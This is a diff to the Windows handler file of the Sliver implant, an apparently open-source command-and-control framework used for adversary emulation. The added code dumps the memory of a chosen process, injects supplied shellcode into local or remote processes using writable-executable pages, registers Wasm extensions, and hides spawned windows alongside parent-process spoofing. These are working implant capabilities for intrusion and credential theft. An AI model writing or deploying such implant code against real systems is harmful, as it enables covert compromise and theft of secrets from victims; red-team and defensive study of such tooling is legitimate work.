@@ -35,6 +35,7 @@ import (
 
 	"github.com/bishopfox/sliver/implant/sliver/extension"
 	"github.com/bishopfox/sliver/implant/sliver/priv"
+	"github.com/bishopfox/sliver/implant/sliver/procdump"
 	"github.com/bishopfox/sliver/implant/sliver/registry"
 	"github.com/bishopfox/sliver/implant/sliver/service"
 	"github.com/bishopfox/sliver/implant/sliver/spoof"
@@ -106,6 +107,11 @@ var (
 		sliverpb.MsgCallExtensionReq:     callExtensionHandler,
 		sliverpb.MsgListExtensionsReq:    listExtensionsHandler,
 
+		// Wasm Extensions - Note that execution can be done via a tunnel handler
+		sliverpb.MsgRegisterWasmExtensionReq:   registerWasmExtensionHandler,
+		sliverpb.MsgDeregisterWasmExtensionReq: deregisterWasmExtensionHandler,
+		sliverpb.MsgListWasmExtensionsReq:      listWasmExtensionsHandler,
+
 		// {{if .Config.WGc2Enabled}}
 		// Wireguard specific
 		sliverpb.MsgWGStartPortFwdReq:   wgStartPortfwdHandler,
@@ -146,6 +152,45 @@ func WrapperHandler(handler RPCHandler, data []byte, resp RPCResponse) {
 }
 
 // ---------------- Windows Handlers ----------------
+
+func dumpHandler(data []byte, resp RPCResponse) {
+	procDumpReq := &sliverpb.ProcessDumpReq{}
+	err := proto.Unmarshal(data, procDumpReq)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("error decoding message: %v", err)
+		// {{end}}
+		return
+	}
+	res, err := procdump.DumpProcess(procDumpReq.Pid)
+	dumpResp := &sliverpb.ProcessDump{Data: res.Data()}
+	if err != nil {
+		dumpResp.Response = &commonpb.Response{
+			Err: fmt.Sprintf("%v", err),
+		}
+	}
+	data, err = proto.Marshal(dumpResp)
+	resp(data, err)
+}
+
+func taskHandler(data []byte, resp RPCResponse) {
+	var err error
+	task := &sliverpb.TaskReq{}
+	err = proto.Unmarshal(data, task)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("error decoding message: %v", err)
+		// {{end}}
+		return
+	}
+
+	if task.Pid == 0 {
+		err = taskrunner.LocalTask(task.Data, task.RWXPages)
+	} else {
+		err = taskrunner.RemoteTask(int(task.Pid), task.Data, task.RWXPages)
+	}
+	resp([]byte{}, err)
+}
 
 func impersonateHandler(data []byte, resp RPCResponse) {
 	impersonateReq := &sliverpb.ImpersonateReq{}
@@ -320,6 +365,8 @@ func executeWindowsHandler(data []byte, resp RPCResponse) {
 	if execReq.UseToken {
 		cmd.SysProcAttr.Token = syscall.Token(priv.CurrentToken)
 	}
+	// Hide the window if requested
+	cmd.SysProcAttr.HideWindow = execReq.HideWindow
 	if execReq.PPid != 0 {
 		err := spoof.SpoofParent(execReq.PPid, cmd)
 		if err != nil {
@@ -749,11 +796,11 @@ func listExtensionsHandler(data []byte, resp RPCResponse) {
 }
 
 // Stub since Windows doesn't support UID
-func getUid(fileInfo os.FileInfo) (string) {
+func getUid(fileInfo os.FileInfo) string {
 	return ""
 }
 
 // Stub since Windows doesn't support GID
-func getGid(fileInfo os.FileInfo) (string) {
-    return ""
+func getGid(fileInfo os.FileInfo) string {
+	return ""
 }
